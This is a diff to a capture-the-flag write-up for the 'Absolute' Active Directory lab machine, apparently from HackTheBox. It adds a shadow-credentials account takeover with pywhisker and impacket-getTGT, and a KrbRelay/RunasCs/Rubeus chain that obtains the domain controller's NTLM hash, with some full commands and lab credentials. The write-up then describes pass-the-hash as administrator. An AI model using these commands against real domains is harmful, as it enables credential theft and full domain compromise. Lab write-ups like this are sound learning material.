@@ -2,7 +2,7 @@
 description: Tough enumeration...
 ---
 
-# Absolute (AD) (WIP!)
+# Absolute (AD)
 
 This is an AD machine, so first we can begin with a port scan, and then go through the usual AD methodology for finding a weakpoint for this system.
 
@@ -164,9 +164,11 @@ You might need to run the last 2 powershell commands again and again until no er
 
 We need to then run this:
 
+{% code overflow="wrap" %}
 ```bash
 impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb; export KRB5CCNAME=m.lovegod.ccache; python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
 ```
+{% endcode %}
 
 Afterwards, we should get a .pfx file.
 
@@ -186,6 +188,49 @@ This would give us an evil\_winrm shell as the user and we can grab the flag.
 
 <figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+The GenericWrite permission on the user allows us to write properties. Hence, we used `pywhisker` to add a new KeyCredential as `m.lovegod` to the `winrm_user` msDs-KeyCredentialLink attribute. This was done **because we don't have a shell**.&#x20;
+
+By creating a shadow credential through GenericWrite privileges, we can add more methods of which an account has to obtain a Kerberos TGT. pyWhisker is just a Python implementation of the main tool, Whisker. The main resource I used for my research was here:
+
+{% embed url="https://pentestlab.blog/tag/msds-keycredentiallink/" %}
+
 ## Privilege Escalation
 
-Really hard...WIP.
+### KrbRelay
+
+The central theme around this machine is to continuously use Kerberos to escalate our privileges. We know that this machine supports PKINIT, allowing for users to authenticate with certificates (that's how we got our user access). Going along that line, we can continue to abuse Shadow Credentials to dump the NTLM hashes.
+
+{% embed url="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html" %}
+
+First, we need the following:
+
+* KrbRelay
+* Rubeus
+* RunasCs
+
+Then, we need to first add a Shadow Credential using KrbRelay through the `m.lovegod` account.&#x20;
+
+{% code overflow="wrap" %}
+```
+.\runasc.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Users\winrm_user\krbrelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred"
+```
+{% endcode %}
+
+This would generate an output like this:
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+What this command does is use a CLSID in order to first add a new msDS-KeyCredentialLink, which would generate another certificate for us similar to `pywhisker`. Afterwards, we can use this certificate to request a TGT as DC$ and get the NTLM hash.
+
+<pre data-overflow="wrap"><code><strong>.\rubeus.exe asktgt /user:DC$ /certificate:&#x3C;CERT> /password:"&#x3C;PASSWORD>" /getcredentials /show
+</strong></code></pre>
+
+This would generate the NTLM hash for us:
+
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Afterwards, we can use `crackmapexec` with this hash to dump the credentials out.
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Then, pass the hash via `evil-winrm` as the administrator.
